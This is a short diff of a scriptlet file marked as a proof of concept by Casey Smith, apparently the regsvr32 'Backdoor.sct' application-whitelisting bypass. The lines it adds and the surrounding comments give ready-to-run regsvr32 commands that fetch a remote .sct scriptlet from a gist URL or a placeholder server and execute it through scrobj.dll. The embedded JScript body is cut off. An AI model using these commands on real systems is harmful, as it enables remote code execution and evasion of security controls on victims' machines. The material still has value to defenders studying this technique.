@@ -10,6 +10,9 @@
 	<!-- regsvr32 /s /i"C:\Bypass\Backdoor.sct" scrobj.dll -->
 	<!-- regsvr32 /s /i:http://server/Backdoor.sct scrobj.dll -->
 	<!-- That should work over a proxy and SSL/TLS... -->
+	<!-- regsvr32 /s https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/bf04e98329ef471dcbbe621df5d61ddb4e802b63/Backdoor.sct -->
+	<!-- regsvr32 /s /n /u /i:https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/bf04e98329ef471dcbbe621df5d61ddb4e802b63/Backdoor.sct scrobj.dll -->
+	
 	<!-- Proof Of Concept - Casey Smith @subTee -->
 	<script language="JScript">
 		<![CDATA[
